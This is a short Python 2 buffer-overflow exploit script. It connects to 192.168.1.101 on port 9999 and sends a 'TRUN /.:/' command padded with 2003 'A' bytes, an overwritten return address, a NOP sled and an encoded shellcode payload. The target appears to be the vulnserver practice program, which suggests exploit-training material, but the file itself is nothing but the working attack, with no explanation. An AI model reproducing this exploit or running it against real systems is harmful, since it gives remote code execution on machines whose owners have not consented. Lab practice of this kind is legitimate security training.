#!/usr/bin/python
import sys
import socket

overflow =(
"\xdb\xc9\xb8\x0c\x36\xfc\xf7\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x52\x31\x42\x17\x83\xc2\x04\x03\x4e\x25\x1e\x02\xb2\xa1\x5c"
"\xed\x4a\x32\x01\x67\xaf\x03\x01\x13\xa4\x34\xb1\x57\xe8\xb8"
"\x3a\x35\x18\x4a\x4e\x92\x2f\xfb\xe5\xc4\x1e\xfc\x56\x34\x01"
"\x7e\xa5\x69\xe1\xbf\x66\x7c\xe0\xf8\x9b\x8d\xb0\x51\xd7\x20"
"\x24\xd5\xad\xf8\xcf\xa5\x20\x79\x2c\x7d\x42\xa8\xe3\xf5\x1d"
"\x6a\x02\xd9\x15\x23\x1c\x3e\x13\xfd\x97\xf4\xef\xfc\x71\xc5"
"\x10\x52\xbc\xe9\xe2\xaa\xf9\xce\x1c\xd9\xf3\x2c\xa0\xda\xc0"
"\x4f\x7e\x6e\xd2\xe8\xf5\xc8\x3e\x08\xd9\x8f\xb5\x06\x96\xc4"
"\x91\x0a\x29\x08\xaa\x37\xa2\xaf\x7c\xbe\xf0\x8b\x58\x9a\xa3"
"\xb2\xf9\x46\x05\xca\x19\x29\xfa\x6e\x52\xc4\xef\x02\x39\x81"
"\xdc\x2e\xc1\x51\x4b\x38\xb2\x63\xd4\x92\x5c\xc8\x9d\x3c\x9b"
"\x2f\xb4\xf9\x33\xce\x37\xfa\x1a\x15\x63\xaa\x34\xbc\x0c\x21"
"\xc4\x41\xd9\xe6\x94\xed\xb2\x46\x44\x4e\x63\x2f\x8e\x41\x5c"
"\x4f\xb1\x8b\xf5\xfa\x48\x5c\xf0\xfa\x50\x93\x6c\xf9\x54\xba"
"\x30\x74\xb2\xd6\xd8\xd0\x6d\x4f\x40\x79\xe5\xee\x8d\x57\x80"
"\x31\x05\x54\x75\xff\xee\x11\x65\x68\x1f\x6c\xd7\x3f\x20\x5a"
"\x7f\xa3\xb3\x01\x7f\xaa\xaf\x9d\x28\xfb\x1e\xd4\xbc\x11\x38"
"\x4e\xa2\xeb\xdc\xa9\x66\x30\x1d\x37\x67\xb5\x19\x13\x77\x03"
"\xa1\x1f\x23\xdb\xf4\xc9\x9d\x9d\xae\xbb\x77\x74\x1c\x12\x1f"
"\x01\x6e\xa5\x59\x0e\xbb\x53\x85\xbf\x12\x22\xba\x70\xf3\xa2"
"\xc3\x6c\x63\x4c\x1e\x35\x83\xaf\x8a\x40\x2c\x76\x5f\xe9\x31"
"\x89\x8a\x2e\x4c\x0a\x3e\xcf\xab\x12\x4b\xca\xf0\x94\xa0\xa6"
"\x69\x71\xc6\x15\x89\x50")

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.1.101',9999))
	s.send(('TRUN /.:/' + shellcode))
	s.close()
	
except:
	print "Error connecting to server"
	sys.exit()
	
